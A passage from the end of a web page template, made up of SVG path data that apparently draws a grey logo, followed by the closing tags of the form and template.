31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z"
                                    fill="#66778A"></path>
                                <path
                                    d="M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z"
                                    fill="#66778A"></path>
                            </g>
                            <defs>
                                <clipPath id="clip0_4111_993">
                                    <rect width="329" height="66" fill="white"></rect>
                                </clipPath>
                            </defs>
                        </svg></div>
                </div>
            </form>

        </div>
    </div>
</template>
